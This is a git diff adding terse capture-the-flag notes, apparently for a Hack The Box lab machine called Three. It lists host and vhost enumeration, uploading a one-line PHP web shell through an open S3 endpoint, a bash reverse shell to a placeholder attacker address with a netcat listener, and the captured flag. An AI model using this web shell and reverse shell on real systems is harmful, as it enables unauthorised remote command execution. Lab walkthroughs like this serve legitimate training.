@@ -97,3 +97,25 @@
 - git clone https://github.com/lgandx/Responder
 - sudo python2 Responder.py -I tun0
 - 
+
+
+## Three challenge:
+- sudo nmap -sV 10.129.101.223
+- echo "10.129.101.223 thetoppers.htb" | sudo tee -a /etc/hosts
+- Tools: `gobuster` , `wfuzz` and `feroxbuster`
+- gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
+- echo "10.129.101.223 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+- apt install awscli
+- aws configure
+- aws --endpoint=http://s3.thetoppers.htb s3 ls
+- aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+- echo '<?php system($_GET["cmd"]); ?>' > shell.php
+- aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+- http://thetoppers.htb/shell.php
+- http://thetoppers.htb/shell.php?cmd=id
+- ifconfig
+- bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+- nc -nvlp 1337
+- python3 -m http.server 8000
+- cat /var/www/flag.txt
+- flag: `a980d99281a28d638ac68b9bf9453c2b`
